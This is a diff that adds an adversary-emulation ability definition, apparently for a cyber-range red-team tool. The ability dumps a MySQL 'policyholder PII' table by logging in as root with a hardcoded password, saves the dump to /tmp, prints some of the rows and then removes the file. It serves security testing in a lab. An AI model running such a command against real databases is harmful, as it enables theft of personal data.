@@ -1,0 +1,16 @@
+- id: col01-db-dump
+  name: Policyholder Database Exfiltration
+  description: Dump the cyber_range database containing policyholder PII records
+  tactic: collection
+  technique:
+    attack_id: T1005
+    name: Data from Local System
+  platforms:
+    linux:
+      sh:
+        command: |
+          mysql -h 10.0.20.30 -u root -proot -e 'SELECT * FROM cyber_range.users;' 2>/dev/null > /tmp/db_dump.txt; echo "Records: $(wc -l < /tmp/db_dump.txt)"; head -5 /tmp/db_dump.txt
+        cleanup: |
+          rm -f /tmp/db_dump.txt
+  singleton: false
+  repeatable: false
